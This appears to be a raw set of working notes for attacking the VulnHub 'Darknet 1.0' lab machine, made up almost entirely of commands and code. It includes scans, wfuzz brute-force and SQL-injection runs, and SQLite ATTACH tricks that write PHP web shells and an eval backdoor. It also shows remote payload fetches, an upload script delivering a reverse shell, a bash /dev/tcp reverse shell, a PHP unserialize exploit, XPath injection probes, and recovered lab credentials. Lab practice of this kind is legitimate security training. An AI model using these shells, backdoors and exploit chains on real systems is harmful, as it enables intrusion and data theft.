http://blog.ottos.network/2015/06/darknet-10-write-up.html

https://www.vulnhub.com/entry/darknet-10,120/


https://leonjza.github.io/blog/2016/06/16/rooting-darknet/#888-authentication-bypass


https://github.com/tennc/webshell/tree/master/php/b374k

https://github.com/tennc/webshell/tree/master/php/wso



http://blog.ottos.network/2015/06/darknet-10-write-up.html


https://jessgallante.blogspot.com/2015/06/mon-tout-premier-challenge-ever.html


https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf



https://github.com/tennc/webshell/tree/master/php/wso



└─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.53
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 10:28 CEST
Nmap scan report for 192.168.110.53
Host is up (0.00044s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          42110/udp6  status
|   100024  1          44595/udp   status
|   100024  1          51000/tcp6  status
|_  100024  1          56607/tcp   status
56607/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:35:C7:24 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 192.168.110.53

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.80 seconds

└─$ dirb http://192.168.110.53

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Sep 22 10:30:56 2021
URL_BASE: http://192.168.110.53/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.53/ ----
==> DIRECTORY: http://192.168.110.53/access/                                                                                                                                                
+ http://192.168.110.53/cgi-bin/ (CODE:403|SIZE:290)
+ http://192.168.110.53/index (CODE:200|SIZE:378)
+ http://192.168.110.53/index.html (CODE:200|SIZE:378)
+ http://192.168.110.53/server-status (CODE:403|SIZE:295)



└─$ nikto -h 192.168.110.53
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.53
+ Target Hostname:    192.168.110.53
+ Target Port:        80
+ Start Time:         2021-09-22 10:38:18 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ Server may leak inodes via ETags, header found with file /, inode: 46398, size: 378, mtime: Mon Mar 23 07:10:38 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /access/: Directory indexing found.
+ OSVDB-3092: /access/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2021-09-22 10:38:25 (GMT2) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested




└─$ cat 888.darknet.com.backup 
<VirtualHost *:80>
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
</VirtualHost>



<input class="textbox" type="text" name="username" placeholder="Usuario" size="18"><br><br>
<input class="textbox" type="password" name="password" placeholder="Clave" size="18"><br><br>
<input class="textbox" type="submit" name="action" value="Login">


wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -d "username=FUZZ&password=password&action=Login" --hc 200 http://888.darknet.com/index.php
wfuzz -c -w /usr/share/wordlists/wfuzz/vulns/sql_inj.txt -d "username=FUZZ&password=password&action=Login" --hc 200 http://888.darknet.com/index.php
wfuzz -c -w /usr/share/wordlists/wfuzz/vulns/sql_inj.txt -d "username=devnull&password=FUZZ&action=Login" --hc 200 http://888.darknet.com/index.php
wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=devnull&password=FUZZ&action=Login" --hc 200 http://888.darknet.com/index.php 
wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=devnull&password=FUZZ&action=Login" http://888.darknet.com/index.php 
wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=admin&password=FUZZ&action=Login" --hc 200 http://888.darknet.com/index.php


curl -c cookie --data-urlencode "username=devnull' or '1" --data-urlencode "password=password" --data-urlencode "action=Login" http://888.darknet.com/main.php 


<textarea class="textbox" name="sql" cols="50" rows="10"></textarea><br><br>
<input class="textbox" type="submit" name="action" value="Exec">


ATTACH DATABASE '/home/devnull/public_html/img/phpinfo.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ('<?php phpinfo(); ?>');

ATTACH DATABASE '/home/devnull/public_html/img/shell.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ('<?php system($_GET['cmd']); ?>');


ATTACH DATABASE '/home/devnull/public_html/img/files.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ("<?php if($_GET['a'] == 'ls') { print_r(scandir($_GET['p'])); } if($_GET['a'] == 'cat') { print_r(readfile($_GET['p'])); } ?>");



if ($_GET["cmd"] == "db") {
    $dbhandler=new SQLite3("/home/devnull/database/888-darknet.db");

    $query = $dbhandler->query("SELECT * FROM login");

    while($result=$query->fetchArray()){
        print_r($result);
        print "<br/>";
    }
}

if ($_GET["cmd"] == "ls") {
    $path = $_GET["arg"];
    @chdir($path);
    $dir = @dir($path);
    while($d = $dir->read()) {
        print $d."<br/>";
    }
}
if ($_GET["cmd"] == "cat") {
    $file = $_GET["arg"];
    $fh = fopen($file, "r");
    if ($fh) {
        while ($l = fgets($fh)) {
            print htmlspecialchars($l)."<br/>";
        }
        fclose($fh);
    } else { print "Cannot open ".$file."<br/>"; }
}


ATTACH DATABASE '/home/devnull/public_html/img/get.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ("<?php $content = file_get_contents("http://192.168.110.1:8888/wso.sh"); echo $content ?>");


attach database '/home/devnull/public_html/img/backdoor.php' as backdoor; create table backdoor.tbl (cmd TEXT); insert into backdoor.tbl (cmd) values ("<?php $_REQUEST[e] ? eval( $_REQUEST[e] ) : exit; ?>");


 ServerName signal8.darknet.com ServerAdmin errorlevel@darknet.com DocumentRoot /home/errorlevel/public_html 



http://signal8.darknet.com/xpanel/
<input class="textbox" type="text" name="username" size="18" placeholder="Usuario"><p>
<input class="textbox" type="password" name="password" size="18" placeholder="Clave"></p><p>
<input class="textbox" type="submit" name="Action" value="Login">


wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -d "username=FUZZ&password=password&Action=Login" --hc 200 http://signal8.darknet.com/xpanel/
wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=admin&password=FUZZ&Action=Login" --hc 200 http://signal8.darknet.com/xpanel/
└─$ wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=devnull&password=FUZZ&Action=Login"  http://signal8.darknet.com/xpanel/
└─$ wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=errorlevel&password=FUZZ&Action=Login"  http://signal8.darknet.com/xpanel/
└─$ wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=admin&password=FUZZ&Action=Login"  http://signal8.darknet.com/xpanel/


└─$ wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt  http://signal8.darknet.com/contact.php?id=FUZZ

attach database '/home/devnull/public_html/img/rfi.php' as backdoor; create table backdoor.tbl (cmd TEXT); insert into backdoor.tbl (cmd) values ("<?php $content = file_get_contents("http://10.0.1.1:8000/b374k.php"); ?>");

$myfile = fopen("/home/devnull/public_html/img/b374k.php", "w");fwrite(file_get_contents("http://10.0.1.1:8000/b374k.php"));



ATTACH DATABASE '/home/devnull/public_html/img/upload.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ("<?php error_reporting(E_ALL); ini_set('display_errors', 1); $fp = fopen($_POST['name'], 'wb'); fwrite($fp, base64_decode($_POST['content'])); fclose($fp); ?>");


```html

<form action="http://888.darknet.com/img/upload.php" method="post">
<input class="textbox" type="text" name="name" value="/home/devnull/public_html/img/shell.php" size="18"><br><br>
<textarea name="content" cols=35 rows=10></textarea><br><br>
<button  type="submit" name="action" value="Valid" />
</form>

```

```config

# phi.ini

safe_mode=OFF
disable_functions=NONE
safe_mode_gid=OFF
open_basedir=OFF


```


```python

#!/usr/bin/python

import requests
import string
import re

def testit(c):
    url = 'https://888.darknet.com/index.php'
    payload = 'username=%s&password=%s&Action=Login' % (c, c)

    r = requests.post(url, data=payload)
    m = re.search('.*Ilegal.*', r.text)
    if m:
        print '%s\tIllegal' % c
    else:
        print '%s\t OK' % c

for c in string.punctuation:
    testit(c)


```



```python

import itertools
import requests
import sys
s = requests.session()
target = 'http://signal8.darknet.com/xpanel/'

url = '%s/index.php'%target
payload = {
    "username":"errorlevel",
    "password":"tc65Igkq6DF"
}
r = s.post(url, data=payload)

url = '%s/ploy.php'%target

for perm in itertools.permutations(["37","58","22","12","72","10","59","17","99"],4):
    payload = {
        "Action":"Upload",
        "checkbox[]":perm
    }
    files={"imag":('testing.php',"<?php phpinfo();")}
    r = s.post(url, data=payload, files=files)

    if r.text.find("Key incorrecta!") == -1:
        print "Pin is: %s"%"".join(perm)
        sys.exit()


```


$ find / -user root -writable 2>/dev/null | grep -v '/proc' | grep -v '/dev'


/bin/bash -i > /dev/tcp/10.0.1.1/1234 0<&1 2>&1




root@kali:~# echo "<?php error_reporting(E_ALL); ini_set('display_errors', 1); ini_set('disable_functions', 0); echo(shell_exec(\$_GET['c'])); ?>" > /var/www/html/phpbackdoor.txt






```php
<?php

//error_reporting(0);

if(!empty($_GET['id'])){
    $id=$_GET['id'];
    if(preg_match('/\*/', $id)){
        exit();
}
    $xml=simplexml_load_file("../users/usuarios.xml");
    $out=$xml->xpath("/auth/user[id={$id}]/email");
    echo "<h3>".$out[0]."</h3>";
}
?>

```


```xml

<auth>
    <user>
        <id>1</id>
        <username>errorlevel</username>
        <email>errorlevel@darknet.com</email>
        <clave>tc65Igkq6DF</clave>
    </user>
    <user>
        <id>2</id>
        <username>devnull</username>
        <email>devnull@darknet.com</email>
        <clave>j4tC1P9aqmY</clave>
    </user>
</auth>


```

XPATH

```bash

URL="http://signal8.darknet.com/contact.php"

curl -G  --data-urlencode "id=1 $1" $URL 

# ./contact.sh 'and count(/child::node())=1'
# ./contact.sh 'and count(..)=1'
# ./contact.sh 'and string-length(email)=22'
# ./contact.sh 'and substring(email,1,2)="er"'
# ./contact.sh 'and string-length(name(..))=4' 
# ./contact.sh 'and substring(name(..),1,1)="a"'
# ./contact.sh 'and substring(name(..),1,4)="auth"'
# ./contact.sh 'and string-length(name(//auth))=4'
# ./contact.sh 'and count(//auth/child::node())=5'
# ./contact.sh 'and count (../child::node())=5'
# ./contact.sh 'and string-length(name(//auth/child::node()[position()=1]))=5'
# ./contact.sh 'and string-length(name(//auth))=4'
# ./contact.sh 'and name()="user"'
# ./contact.sh 'and starts-with(email, 'e')'
# ./contact.sh 'and starts-with(email, 'errorlevel')'
```

```python

import requests
import string

session = requests.Session()


url = "http://888.darknet.com/"

response = session.get(url)
cookies = session.cookies.get_dict()
# print (cookies)

# <input class="textbox" type="text" name="username" placeholder="Usuario" size="18"><br><br>
# <input class="textbox" type="password" name="password" placeholder="Clave" size="18"><br><br>
# <input class="textbox" type="submit" name="action" value="Login">

# data = {"username":"%s", "password":"%s", "action":"Login"}


# for c in string.punctuation:
#   d = {"action":"Login"}
#   d['username'] = c
#   d['password'] = c
#   r = session.post(url, data=d, cookies=cookies)
#   # print(type(r.text))

#   # if "\nFail" in r.text:
#   #   print('Fail : %s' % c)
#   if "Ilegal" in r.text:
#       print('Ilegal : %s' % c)



data = {"username":"devnull' or '1", "password":"xxxxxxxx", "action":"Login"}
r = session.post(url, data=data, cookies=cookies)
url_main  = r.url
r = requests.get(url_main, cookies=cookies)
print (r.text)
# cookies = session.cookies.get_dict()
# print (cookies)


```
Upload

```python

import requests
import base64

session = requests.Session()


url = "http://888.darknet.com/img/upload.php"

# upload.php
# <?php
# error_reporting(E_ALL);
# ini_set('display_errors', 1);
# $fp = fopen($_POST['name'], 'wb');
# fwrite($fp, base64_decode($_POST['content']));
# fclose($fp);
# ?>

# php = b"<?php phpinfo(); ?>"
# php_b64 = base64.b64encode(php).decode()
# data = {"name":"info.php", "content":php_b64}
# r = session.post(url, data=data)
# print (r.text)



with open('php-reverse-shell.php', 'rb') as f:
    php = f.read()
    php_b64 = base64.b64encode(php).decode()
    data = {"name":"rev.php", "content":php_b64}
    r = session.post(url, data=data)
    print (r.text)

# with open('meterpreter.php', 'rb') as f:
#   php = f.read()
#   php_b64 = base64.b64encode(php).decode()
#   data = {"name":"meterpreter.php", "content":php_b64}
#   r = session.post(url, data=data)
#   print (r.text)



```

```bash
URL="http://888.darknet.com/img/upload.php"

# upload.php
# <?php
# error_reporting(E_ALL);
# ini_set('display_errors', 1);
# $fp = fopen($_POST['name'], 'wb');
# fwrite($fp, base64_decode($_POST['content']));
# fclose($fp);
# ?>

# $0 : Contient le nom du script tel qu'il a été invoqué
# $* : L'ensembles des paramètres sous la forme d'un seul argument
# $@ :  L'ensemble des arguments, un argument par paramètre
# $# : Le nombre de paramètres passés au script
# $? : Le code retour de la dernière commande
# $$ : Le PID su shell qui exécute le script
# $! : Le PID du dernier processus lancé en arrière-plan

if [ $# -eq 2 ]
then
    curl  --data-urlencode "name=$2" --data-urlencode "content=$(base64 $1)" $URL --output -
else
    echo "Ex: $0 php-reverse-shell.php abc.php"
fi




```


unserialize

```python
import requests
import string

session = requests.Session()


url = "http://192.168.110.53/sec.php"

response = session.get(url)
cookies = session.cookies.get_dict()
# data = {'test':'O:4:"Show":1:{s:4:"woot";s:4:"ROOT";}'}
data = {
  
    # "test":'O:4:"Test":3:{s:4:"path";s:8:"/var/www";s:9:"name_file";s:15:"meterpreter.php";s:3:"url";s:45:"/home/devnull/public_html/img/meterpreter.php";}'
    "test" : 'O:4:"Test":3:{s:3:"url";s:45:"/home/devnull/public_html/img/meterpreter.php";s:9:"name_file";s:9:"shell.php";s:4:"path";s:8:"/var/www";}'
  
    }


r = session.post(url, data=data, cookies=cookies)
print (r.text)
# cookies = session.cookies.get_dict()
# print (cookies)


```
```bash

curl --data-urlencode 'test=O:4:"Test":3:{s:3:"url";s:37:"/home/devnull/public_html/img/php.ini";s:9:"name_file";s:7:"php.ini";s:4:"path";s:8:"/var/www";}' http://192.168.110.53/sec.php

```



```php
echo '<?php' > xpath.php
echo 'error_reporting(E_ALL);' >> xpath.php
echo 'ini_set("display_errors", 1);' >> xpath.php
echo '$xml=simplexml_load_file("../users/usuarios.xml");' >> xpath.php
echo '$p=$_GET["p"];' >> xpath.php
echo 'print_r($p);' >> xpath.php
echo '$out = $xml->xpath($p);' >> xpath.php
echo 'var_dump($out);' >> xpath.php
echo 'echo($out[0]);' >> xpath.php
echo '?>' >> xpath.php
chown errorlevel:errorlevel xpath.php
cat xpath.php

echo '$p="/auth/user[id=1]/email";' >> xpath.php





```


```php

<?php

require "Classes/Test.php";
require "Classes/Show.php";

if(!empty($_POST['test'])){
    $d=$_POST['test'];
    $j=unserialize($d);
    echo $j;
}
echo $j;


/*
$t = new Test;

$t->url = "php-reverse-shell.php";
$t->name_file = "shell.php";
$t->path = "./";

$a = serialize($t);
var_dump($a);

$d = 'O:4:"Test":3:{s:3:"url";s:21:"php-reverse-shell.php";s:9:"name_file";s:9:"shell.php";s:4:"path";s:2:"./";}';
$j=unserialize($d);

$j=unserialize($a);
var_dump($j);

*/

?>

```

```php
<?php

class Test {

    public $url;
    public $name_file;
    public $path;


    function __construct() {
        print "In constructor\n";
    }

   
    function __destruct(){
        echo $this->url;
        echo $this->path;
        echo $this->name_file;
        $data=file_get_contents($this->url);
        $f=fopen($this->path."/".$this->name_file, "w");
        fwrite($f, $data);
        fclose($f);
        chmod($this->path."/".$this->name_file, 0644);
    }

}

?>


```


```php
echo '<?php' > test.php
echo '    $id=$_GET["id"];' >> test.php
echo '    $xml=simplexml_load_file("../users/usuarios.xml");' >> test.php
echo '    $p = "/auth/user[id={$id}]/email";' >> test.php
echo '    print_r ($p);' >> test.php
echo '    $out=$xml->xpath("/auth/user[id={$id}]/email");' >> test.php
echo '    echo "<h3>".$out[0]."</h3>";' >> test.php
echo '    $out=$xml->xpath("/auth/user[id=1]/username");' >> test.php
echo '    var_dump ($out);' >> test.php
echo '    echo "<h3>".$out[0]."</h3>";' >> test.php
echo '?>' >> test.php

chown errorlevel:errorlevel test.php
cat test.php

```


